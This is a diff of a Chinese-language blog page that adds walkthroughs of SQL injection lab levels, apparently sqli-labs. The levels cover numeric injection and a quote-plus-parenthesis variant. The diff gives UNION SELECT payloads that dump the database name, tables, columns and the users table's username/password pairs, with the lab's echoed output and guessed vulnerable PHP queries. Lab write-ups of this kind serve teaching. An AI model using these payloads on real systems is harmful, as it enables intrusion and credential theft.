@@ -114,8 +114,65 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
 
 <p>发现回显位。</p>
-<p>进行爆库测试，</p>
+<p>进行爆库测试，注入?id&#x3D;-1 UNION SELECT 1, database(), 3。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome  Dhakkan</span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现数据库名字，security。</p>
+<p>进行爆表，注入?id&#x3D;-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema &#x3D; ‘security’。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome  Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现表名，看看表数据。</p>
+<p>注入?id&#x3D;-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name &#x3D; ‘users’。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>ok，直接注入?id&#x3D;-1 UNION SELECT 1, group_concat(username, ‘~’, password), 3 FROM users。看看内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb~Dumb,Angelina~I-kill-you,Dummy~p@ssword,secure~crappy,stupid~stupidity,superman~genious,batman~mob!le,admin~admin,admin1~admin1,admin2~admin2,admin3~admin3,dhakkan~dumbo,admin4~admin4</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>换个注入方式看一下，注入?id&#x3D;-1 UNION SELECT 1,group_concat(username SEPARATOR ‘-‘),group_concat(password SEPARATOR ‘-‘) FROM users。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb-Angelina-Dummy-secure-stupid-superman-batman-admin-admin1-admin2-admin3-dhakkan-admin4</span><br><span class="line">Your Password:Dumb-I-kill-you-p@ssword-crappy-stupidity-genious-mob!le-admin-admin1-admin2-admin3-dumbo-admin4</span><br></pre></td></tr></table></figure>
+
+<p>所以后端应该就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这种的类型。</p>
 <hr>
+<h2 id="3："><a href="#3：" class="headerlink" title="#3："></a>#3：</h2><p><img src="/images/QQ20251226-183830.png" alt="alt text"></p>
+<p>通过基本的注入测试。</p>
+<p>?id&#x3D;1	?id&#x3D;2	?id&#x3D;2-1	?id&#x3D;1’。</p>
+<p>发现大概率为字符型sql。</p>
+<p>但直接注入?id&#x3D;1’ ORDER BY 3 –+。</p>
+<p>题目报错。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;ORDER BY 3 -- &#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>根据回显的报错信息可以看见。</p>
+<p>在 – 的后面多了一个’)，因此我们就可以猜测，也许题目的源码就是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = (&#x27;$id&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>试着注入?id&#x3D;1’) ORDER BY 3 –+。</p>
+<p>发现不报错了，测试一番后确定。</p>
+<p>列数为3。</p>
+<p>注入?id&#x3D;-1’) UNION SELECT 1, database(), 3 –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>确认库名，security。</p>
+<p>注入?id&#x3D;-1’) UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema &#x3D; ‘security’ –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>ok，其实后面的过程就跟正常的字符型注入一样了，只是之前是单引号，这次的后端限制我们是单引号加右括号了。</p>
+<p>最终注入?id&#x3D;-1’) UNION SELECT 1,group_concat(username SEPARATOR ‘-‘),group_concat(password SEPARATOR ‘-‘) FROM users –+。</p>
+<p>就能拿到重要信息了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb-Angelina-Dummy-secure-stupid-superman-batman-admin-admin1-admin2-admin3-dhakkan-admin4</span><br><span class="line">Your Password:Dumb-I-kill-you-p@ssword-crappy-stupidity-genious-mob!le-admin-admin1-admin2-admin3-dumbo-admin4</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="4："><a href="#4：" class="headerlink" title="#4："></a>#4：</h2><hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
         </div>
@@ -124,6 +181,6 @@
 
 </div>
 
-<script src="/js/main.js?v=1766732056730"></script>
+<script src="/js/main.js?v=1766747402701"></script>
 </body>
 </html>
